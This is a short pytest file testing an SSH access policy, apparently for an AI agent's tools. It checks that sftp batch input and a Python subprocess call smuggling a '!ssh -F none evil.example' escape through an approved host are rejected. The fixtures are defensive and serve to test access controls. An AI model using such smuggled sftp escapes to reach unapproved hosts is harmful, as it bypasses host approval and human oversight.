import pytest
from core.inference.ssh_policy import check_ssh_command_access
from core.inference.tools import _check_code_safety
from state.ssh_approvals import approve_hosts,reset_ssh_approvals

@pytest.mark.parametrize('command',[
 "printf '%s\\n' '!ssh -F none evil.example' | sftp -F none -b - approved.example",
 "sftp -F none -b commands.txt approved.example",
 "sftp -F none -bcommands.txt approved.example",
 "printf '%s\\n' '!ssh -F none evil.example' | sftp -F none approved.example",
 "sftp -F none approved.example < commands.txt",
])
def test_sftp_command_input_fails_closed(command):
 reset_ssh_approvals();approve_hosts('round13',['approved.example'])
 assert check_ssh_command_access(command,'round13') is not None


def test_python_sftp_input_fails_closed():
 reset_ssh_approvals();approve_hosts('round13',['approved.example'])
 code="import subprocess; subprocess.run(['sftp','-F','none','approved.example'],input='!ssh -F none evil.example',text=True)"
 assert _check_code_safety(code,session_id='round13') is not None
